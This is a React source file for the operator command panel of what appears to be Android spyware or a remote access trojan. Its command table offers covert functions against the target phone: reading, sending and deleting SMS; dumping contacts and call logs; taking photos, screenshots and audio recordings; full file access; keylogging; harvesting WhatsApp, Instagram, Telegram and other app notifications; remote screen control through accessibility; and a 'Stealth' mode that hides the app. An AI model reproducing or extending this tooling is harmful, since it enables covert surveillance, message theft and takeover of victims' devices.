import React, { useState } from 'react';
import ParamModal from './ParamModal.jsx';

const COMMANDS = {
  system: {
    label: 'System',
    icon: '💻',
    cmds: [
      { id: 'ping',                    icon: '📡', label: 'Ping' },
      { id: 'get_accessibility_status',icon: '♿', label: 'Accessibility?' },
      { id: 'get_device_info',         icon: 'ℹ️',  label: 'Device Info' },
      { id: 'get_battery_info',        icon: '🔋', label: 'Battery' },
      { id: 'get_network_info',        icon: '🌐', label: 'Network' },
      { id: 'get_wifi_networks',       icon: '📶', label: 'WiFi Nets' },
      { id: 'get_system_info',         icon: '🖥️', label: 'System Info' },
      { id: 'get_installed_apps',      icon: '📦', label: 'Installed Apps' },
    ]
  },
  location: {
    label: 'Location',
    icon: '📍',
    cmds: [
      { id: 'get_location', icon: '📍', label: 'Get Location' },
    ]
  },
  device: {
    label: 'Device',
    icon: '📳',
    cmds: [
      { id: 'vibrate',       icon: '📳', label: 'Vibrate',       params: [{ key: 'duration', label: 'Duration (ms)', default: '500' }] },
      { id: 'play_sound',    icon: '🔊', label: 'Play Sound' },
      { id: 'get_clipboard', icon: '📋', label: 'Get Clipboard' },
      { id: 'set_clipboard', icon: '📋', label: 'Set Clipboard', params: [{ key: 'text', label: 'Text to set', default: '' }] },
    ]
  },
  sms: {
    label: 'SMS',
    icon: '💬',
    cmds: [
      { id: 'get_all_sms',         icon: '💬', label: 'All SMS',     params: [{ key: 'limit', label: 'Limit', default: '100' }] },
      { id: 'get_sms_from_number', icon: '💬', label: 'SMS From #',  params: [{ key: 'phoneNumber', label: 'Phone Number', default: '' }, { key: 'limit', label: 'Limit', default: '50' }] },
      { id: 'send_sms',            icon: '📤', label: 'Send SMS',    params: [{ key: 'phoneNumber', label: 'Phone Number', default: '' }, { key: 'message', label: 'Message', default: '' }] },
      { id: 'delete_sms',          icon: '🗑️', label: 'Delete SMS',  params: [{ key: 'smsId', label: 'SMS ID', default: '' }] },
    ]
  },
  contacts: {
    label: 'Contacts',
    icon: '👥',
    cmds: [
      { id: 'get_all_contacts',  icon: '👥', label: 'All Contacts' },
      { id: 'search_contacts',   icon: '🔍', label: 'Search',       params: [{ key: 'query', label: 'Search Query', default: '' }] },
    ]
  },
  calls: {
    label: 'Calls',
    icon: '📞',
    cmds: [
      { id: 'get_all_call_logs',       icon: '📞', label: 'All Calls',     params: [{ key: 'limit', label: 'Limit', default: '100' }] },
      { id: 'get_call_statistics',     icon: '📊', label: 'Call Stats' },
      { id: 'get_call_logs_by_type',   icon: '📞', label: 'By Type',       params: [{ key: 'callType', label: 'Type (1=in, 2=out, 3=missed)', default: '1' }, { key: 'limit', label: 'Limit', default: '50' }] },
      { id: 'get_call_logs_from_number', icon: '📞', label: 'From Number', params: [{ key: 'phoneNumber', label: 'Phone Number', default: '' }, { key: 'limit', label: 'Limit', default: '50' }] },
    ]
  },
  camera: {
    label: 'Camera',
    icon: '📷',
    cmds: [
      { id: 'get_available_cameras', icon: '📷', label: 'List Cameras' },
      { id: 'take_photo',            icon: '📸', label: 'Take Photo',   params: [{ key: 'cameraId', label: 'Camera ID (0=back, 1=front)', default: '0' }, { key: 'quality', label: 'Quality (low/mid/high)', default: 'high' }] },
      { id: 'take_screenshot',       icon: '🖼️', label: 'Screenshot' },
    ]
  },
  audio: {
    label: 'Audio',
    icon: '🎤',
    cmds: [
      { id: 'start_recording',      icon: '🎤', label: 'Start Rec',     params: [{ key: 'filename', label: 'Filename (optional)', default: '' }] },
      { id: 'stop_recording',       icon: '⏹️', label: 'Stop Rec' },
      { id: 'get_recording_status', icon: '🎙️', label: 'Rec Status' },
      { id: 'list_recordings',      icon: '🎵', label: 'List Recs' },
      { id: 'get_audio',            icon: '📥', label: 'Get Audio',      params: [{ key: 'filePath', label: 'File Path', default: '' }] },
      { id: 'delete_recording',     icon: '🗑️', label: 'Delete Rec',    params: [{ key: 'filePath', label: 'File Path', default: '' }] },
    ]
  },
  files: {
    label: 'Files',
    icon: '📁',
    cmds: [
      { id: 'list_files',         icon: '📁', label: 'List Files',     params: [{ key: 'path', label: 'Path (blank = root)', default: '' }] },
      { id: 'read_file',          icon: '📄', label: 'Read File',      params: [{ key: 'filePath', label: 'File Path', default: '' }, { key: 'asBase64', label: 'As Base64 (true/false)', default: 'false' }] },
      { id: 'write_file',         icon: '✏️', label: 'Write File',     params: [{ key: 'filePath', label: 'File Path', default: '' }, { key: 'content', label: 'Content', default: '' }, { key: 'isBase64', label: 'Is Base64 (true/false)', default: 'false' }] },
      { id: 'copy_file',          icon: '📋', label: 'Copy File',      params: [{ key: 'sourcePath', label: 'Source Path', default: '' }, { key: 'destPath', label: 'Dest Path', default: '' }] },
      { id: 'move_file',          icon: '✂️', label: 'Move File',      params: [{ key: 'sourcePath', label: 'Source Path', default: '' }, { key: 'destPath', label: 'Dest Path', default: '' }] },
      { id: 'create_directory',   icon: '📂', label: 'Create Dir',     params: [{ key: 'path', label: 'Directory Path', default: '' }] },
      { id: 'search_files',       icon: '🔍', label: 'Search Files',   params: [{ key: 'directory', label: 'Directory', default: '/sdcard' }, { key: 'query', label: 'Query', default: '' }] },
      { id: 'get_file_info',      icon: '📄', label: 'File Info',      params: [{ key: 'filePath', label: 'File Path', default: '' }] },
      { id: 'delete_file',        icon: '🗑️', label: 'Delete File',    params: [{ key: 'filePath', label: 'File Path', default: '' }] },
    ]
  },
  keylog: {
    label: 'Keylog',
    icon: '⌨️',
    cmds: [
      { id: 'get_keylogs',   icon: '⌨️', label: 'Get Keylogs',  params: [{ key: 'limit', label: 'Limit', default: '100' }] },
      { id: 'clear_keylogs', icon: '🧹', label: 'Clear Keylogs' },
    ]
  },
  notifications: {
    label: 'Notifs',
    icon: '🔔',
    cmds: [
      { id: 'get_notifications',           icon: '🔔', label: 'All Notifs' },
      { id: 'get_notifications_from_app',  icon: '🔔', label: 'By App',      params: [{ key: 'packageName', label: 'Package Name', default: 'com.whatsapp' }] },
      { id: 'clear_notifications',         icon: '🧹', label: 'Clear Notifs' },
    ]
  },
  screen_ctrl: {
    label: 'Screen Ctrl',
    icon: '👆',
    cmds: [
      { id: 'press_home',         icon: '🏠', label: 'Home' },
      { id: 'press_back',         icon: '◀️', label: 'Back' },
      { id: 'press_recents',      icon: '⬜', label: 'Recents' },
      { id: 'open_notifications', icon: '🔔', label: 'Open Notifs' },
      { id: 'open_quick_settings',icon: '⚙️', label: 'Quick Settings' },
      { id: 'scroll_up',          icon: '⬆️', label: 'Scroll Up' },
      { id: 'scroll_down',        icon: '⬇️', label: 'Scroll Down' },
      {
        id: 'touch', icon: '👆', label: 'Touch',
        params: [
          { key: 'x',        label: 'X',           default: '540' },
          { key: 'y',        label: 'Y',           default: '960' },
          { key: 'duration', label: 'Duration (ms)',default: '100' },
        ]
      },
      {
        id: 'swipe', icon: '↔️', label: 'Swipe',
        params: [
          { key: 'startX',   label: 'Start X',     default: '540' },
          { key: 'startY',   label: 'Start Y',     default: '1200' },
          { key: 'endX',     label: 'End X',       default: '540' },
          { key: 'endY',     label: 'End Y',       default: '400' },
          { key: 'duration', label: 'Duration (ms)',default: '300' },
        ]
      },
      {
        id: 'input_text', icon: '✏️', label: 'Type Text',
        params: [{ key: 'text', label: 'Text to type', default: '' }]
      },
      {
        id: 'click_by_text', icon: '🔍', label: 'Click By Text',
        params: [{ key: 'text', label: 'Element text', default: '' }]
      },
    ]
  },
  screen_reader: {
    label: 'Screen Read',
    icon: '📺',
    cmds: [
      { id: 'read_screen',             icon: '📺', label: 'Read Screen' },
      { id: 'get_current_app',         icon: '📱', label: 'Current App' },
      { id: 'get_clickable_elements',  icon: '👆', label: 'Clickable Els' },
      { id: 'get_input_fields',        icon: '✏️', label: 'Input Fields' },
      { id: 'find_by_text',            icon: '🔍', label: 'Find By Text', params: [{ key: 'text', label: 'Text to find', default: '' }] },
    ]
  },
  social_media: {
    label: 'Social Media',
    icon: '📱',
    cmds: [
      { id: 'get_notifications_from_app', icon: '💬', label: 'WhatsApp',   params: [{ key: 'packageName', label: 'Package', default: 'com.whatsapp' }] },
      { id: 'get_notifications_from_app', icon: '📸', label: 'Instagram',  params: [{ key: 'packageName', label: 'Package', default: 'com.instagram.android' }] },
      { id: 'get_notifications_from_app', icon: '🐦', label: 'Twitter/X',  params: [{ key: 'packageName', label: 'Package', default: 'com.twitter.android' }] },
      { id: 'get_notifications_from_app', icon: '📘', label: 'Facebook',   params: [{ key: 'packageName', label: 'Package', default: 'com.facebook.katana' }] },
      { id: 'get_notifications_from_app', icon: '📲', label: 'Telegram',   params: [{ key: 'packageName', label: 'Package', default: 'org.telegram.messenger' }] },
      { id: 'get_notifications_from_app', icon: '💼', label: 'Snapchat',   params: [{ key: 'packageName', label: 'Package', default: 'com.snapchat.android' }] },
      { id: 'get_notifications_from_app', icon: '🎵', label: 'TikTok',     params: [{ key: 'packageName', label: 'Package', default: 'com.zhiliaoapp.musically' }] },
      { id: 'get_notifications_from_app', icon: '📱', label: 'Custom App', params: [{ key: 'packageName', label: 'Package Name', default: '' }] },
      { id: 'get_notifications',          icon: '🔔', label: 'All Notifs' },
      { id: 'clear_notifications',        icon: '🧹', label: 'Clear All' },
    ]
  },
  stealth: {
    label: 'Stealth',
    icon: '👻',
    cmds: [
      { id: 'fully_hide_app',   icon: '🔒', label: 'Hide App (Full)' },
      { id: 'fully_show_app',    icon: '🔓', label: 'Show App (Full)' },
    ]
  }
};

const ALL_CATS = Object.keys(COMMANDS);

export default function CommandPanel({ onSend, disabled, pendingCommands }) {
  const [activeCat, setActiveCat] = useState('system');
  const [modal, setModal] = useState(null);

  const handleCmdClick = (cmd) => {
    if (disabled) return;
    if (cmd.params && cmd.params.length > 0) {
      setModal(cmd);
    } else {
      onSend(cmd.id, null);
    }
  };

  const handleModalSend = (cmd, values) => {
    const params = {};
    (cmd.params || []).forEach(p => {
      const v = values[p.key];
      if (v !== '') params[p.key] = v;
    });
    onSend(cmd.id, Object.keys(params).length > 0 ? params : null);
    setModal(null);
  };

  const cat = COMMANDS[activeCat];

  return (
    <div>
      <div className="cmd-categories">
        {ALL_CATS.map(key => (
          <button
            key={key}
            className={`cat-btn ${activeCat === key ? 'active' : ''}`}
            onClick={() => setActiveCat(key)}
          >
            {COMMANDS[key].icon} {COMMANDS[key].label}
          </button>
        ))}
      </div>

      <div className="cmd-grid">
        {cat.cmds.map(cmd => {
          const isPending = pendingCommands.includes(cmd.id);
          return (
            <button
              key={cmd.id}
              className={`cmd-btn ${isPending ? 'pending' : ''}`}
              onClick={() => handleCmdClick(cmd)}
              disabled={disabled}
              title={cmd.id}
            >
              <span className="cmd-icon">{cmd.icon}</span>
              <span className="cmd-label">
                {cmd.label}
                {cmd.params && cmd.params.length > 0 && <span style={{ color: '#7c3aed' }}> ⚙</span>}
              </span>
              {isPending && <span style={{ fontSize: 10, color: '#f59e0b' }}>sending...</span>}
            </button>
          );
        })}
      </div>

      {modal && (
        <ParamModal
          cmd={modal}
          onSend={(values) => handleModalSend(modal, values)}
          onClose={() => setModal(null)}
        />
      )}
    </div>
  );
}
